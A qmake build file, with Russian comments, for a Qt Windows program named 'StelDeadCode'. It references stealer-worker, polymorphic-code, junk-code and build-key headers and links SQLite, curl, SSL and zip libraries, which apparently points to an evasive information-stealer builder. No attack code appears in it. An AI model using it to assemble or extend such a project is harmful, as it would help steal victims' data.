# Основные модули Qt
QT += core gui network widgets sql

# Имя цели и шаблон приложения
TARGET = StelDeadCode
TEMPLATE = app
CONFIG += release c++17

# Исходные файлы
SOURCES += \
    ../src/main.cpp \
    mainwindow.cpp

# Заголовочные файлы
HEADERS += \
    mainwindow.h \
    ../src/build_key.h \
    ../src/polymorphic_code.h \
    ../src/junk_code.h \
    ../src/stealerworker.h

# Формы Qt Designer
FORMS += \
    mainwindow.ui

# Ресурсы (иконка приложения)
RC_FILE = ../icon.rc

# Пути для включения заголовков
INCLUDEPATH += \
    ../src \
    . \
    C:/vcpkg/installed/x64-mingw-dynamic/include

# Библиотеки для линковки
LIBS += -LC:/vcpkg/installed/x64-mingw-dynamic/lib \
        -lsqlite3 \
        -lcurl \
        -lssl \
        -lcrypto \
        -lzip \
        -lbz2 \
        -lz

# Флаги компиляции
QMAKE_CXXFLAGS += -O2 \
                  -Wall \
                  -Wextra \
                  -Werror=return-type

# Флаги линковки
QMAKE_LFLAGS += -O2 \
                -Wl,-subsystem,windows \
                -mthreads

# Определения для сборки (задаются через workflow)
DEFINES += QT_NO_DEBUG

# Директории для сборки
DESTDIR = ../build/release
OBJECTS_DIR = ../build/release
MOC_DIR = ../build/release
UI_DIR = ../build/release

# Очистка при сборке
QMAKE_CLEAN += \
    ../build/release/*.exe \
    ../build/release/*.o \
    ../build/release/moc_*.cpp \
    ../build/release/ui_*.h

# Настройки для Windows
win32 {
    CONFIG(debug, debug|release) {
        QMAKE_CXXFLAGS += -g
        QMAKE_LFLAGS -= -O2
        DESTDIR = ../build/debug
        OBJECTS_DIR = ../build/debug
        MOC_DIR = ../build/debug
        UI_DIR = ../build/debug
        QMAKE_CLEAN += \
            ../build/debug/*.exe \
            ../build/debug/*.o \
            ../build/debug/moc_*.cpp \
            ../build/debug/ui_*.h
    }
}

# Зависимости перед сборкой
PRE_TARGETDEPS += \
    ../src/build_key.h \
    ../src/polymorphic_code.h \
    ../src/junk_code.h \
    ../src/stealerworker.h \
    $$UI_DIR/ui_mainwindow.h